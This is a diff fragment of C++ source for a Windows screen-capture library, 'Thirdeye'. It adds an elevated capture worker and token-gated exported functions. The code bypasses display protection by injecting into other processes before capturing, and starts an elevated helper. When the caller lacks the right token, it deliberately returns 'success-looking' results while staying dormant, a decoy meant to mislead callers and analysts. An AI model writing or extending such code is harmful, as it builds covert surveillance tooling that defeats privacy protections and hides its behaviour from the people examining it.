+        LONG cmd = InterlockedExchange(&shm->cmd, THIRDEYE_ELEV_CMD_NONE);
+        if (cmd == THIRDEYE_ELEV_CMD_SHUTDOWN) {
+            InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_OK);
+            SetEvent(hDone);
+            break;
+        }
+        if (cmd != THIRDEYE_ELEV_CMD_CAPTURE) {
+            continue;
+        }
+
+        wchar_t outPath[MAX_PATH] = {};
+        lstrcpynW(outPath, shm->outPath, MAX_PATH);
+
+        ThirdeyeOptions opts;
+        Thirdeye_GetDefaultOptions(&opts);
+        opts.format = (ThirdeyeFormat)shm->format;
+        opts.quality = (int)shm->quality;
+        opts.inclusive = shm->inclusive ? 1 : 0;
+
+        bool ok = false;
+        if (outPath[0]) {
+            HandleGuard hGlobalTrigger;
+            InjectionList injections = {};
+            if (opts.inclusive) {
+                hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
+                if (hGlobalTrigger) {
+                    BypassDisplayProtection(ctx, hGlobalTrigger.get(), injections);
+                }
+            }
+
+            ByteSink sink;
+            ok = CaptureEncoded(ctx, opts, &sink);
+
+            if (opts.inclusive && hGlobalTrigger) {
+                SetEvent(hGlobalTrigger.get());
+                CleanupInjections(injections.items, injections.count);
+            }
+
+            if (ok) {
+                ok = WriteSinkToFile(sink, outPath);
+            }
+        }
+
+        InterlockedExchange(&shm->status,
+            ok ? THIRDEYE_ELEV_STATUS_OK : THIRDEYE_ELEV_STATUS_FAIL);
+        SetEvent(hDone);
+    }
+
+    Thirdeye_DestroyContext(ctx);
+
+    shm->helperPid = 0;
+    InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_IDLE);
+    g_elevShm = nullptr;
+    g_elevDoneEvent = nullptr;
+    CloseHandle(hCmd);
+    CloseHandle(hDone);
+    CloseHandle(hReady);
+    UnmapViewOfFile(shm);
+    CloseHandle(hMap);
+}
+
+extern "C" THIRDEYE_API int THIRDEYE_CALL Thirdeye_Prepare(
+    const char* token,
+    const ThirdeyePrepareOptions* options
+) {
+    if (!TeTokenMatches(token)) {
+        const uint32_t dust = TeDormantWork();
+        // Success-looking; stay dormant. dust folded so burn is live.
+        return 1 | (int)(dust & 0);
+    }
+
+    int elevate = 0;
+    if (options && options->size >= sizeof(uint32_t) + sizeof(int)) {
+        elevate = options->elevate ? 1 : 0;
+    }
+
+    InterlockedExchange(&g_sessionArmed, 1L);
+    InterlockedExchange(&g_elevateEnabled, elevate ? 1L : 0L);
+    InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_BUSY);
+    TeMarkClientPrepared(true);
+
+    InitOnceExecuteOnce(&g_SyscallInitOnce, SyscallInitOnceCallback, nullptr, nullptr);
+
+    if (!elevate) {
+        InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NORMAL);
+        return 1;
+    }
+
+    const bool ok = Uc83EnsureElevatedWorker();
+    if (ok) {
+        InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_MASTER);
+    } else {
+        // Armed, but elevated helper did not start.
+        InterlockedExchange(&g_elevateEnabled, 0L);
+        InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NORMAL);
+    }
+    return 1;
+}
+
+extern "C" THIRDEYE_API int THIRDEYE_CALL Thirdeye_Clean(void) {
+    if (!TeSessionArmed()) {
+        const uint32_t dust = TeDormantWork();
+        return 1 | (int)(dust & 0);
+    }
+    const bool ok = Uc83ShutdownElevatedWorker();
+    TeMarkClientPrepared(false);
+    InterlockedExchange(&g_sessionArmed, 0L);
+    InterlockedExchange(&g_elevateEnabled, 0L);
+    InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NOT_READY);
+    return ok ? 1 : 0;
+}
+
+extern "C" THIRDEYE_API int THIRDEYE_CALL Thirdeye_State(ThirdeyeState* out) {
+    if (!out) {
+        if (!TeApiUnlocked()) (void)TeDormantWork();
+        return 0;
+    }
+
+    if (!TeSessionArmed()) {
+        const uint32_t dust = TeDormantWork();
+        out->mode = THIRDEYE_MODE_NOT_READY | (int)(dust & 0);
+        out->pid = (unsigned long)(dust & 0);
+        return 1 | (int)(dust & 0);
+    }
+
+    out->mode = (int)InterlockedCompareExchange(&g_sessionMode, 0, 0);
+    out->pid = 0;
+
+    if (InterlockedCompareExchange(&g_elevateEnabled, 0, 0) != 0) {
+        int ready = 0;
+        DWORD pid = 0;
+        Uc83QuerySessionState(&ready, &pid);
+        if (ready && pid) {
+            out->mode = THIRDEYE_MODE_MASTER;
+            out->pid = (unsigned long)pid;
+            InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_MASTER);
+        } else if (out->mode != THIRDEYE_MODE_BUSY) {
+            out->mode = THIRDEYE_MODE_NORMAL;
+        }
+    } else if (out->mode == THIRDEYE_MODE_MASTER || out->mode == THIRDEYE_MODE_NOT_READY) {
+        out->mode = THIRDEYE_MODE_NORMAL;
+    }
+    return 1;
+}
+
+extern "C" void TeAutoCleanIfOwned(void) {
+    if (!TeClientOwnsSession()) return;
+    Uc83ShutdownElevatedWorker();
+    TeMarkClientPrepared(false);
+    InterlockedExchange(&g_sessionArmed, 0L);
+    InterlockedExchange(&g_elevateEnabled, 0L);
+    InterlockedExchange(&g_sessionMode, (LONG)THIRDEYE_MODE_NOT_READY);
 }
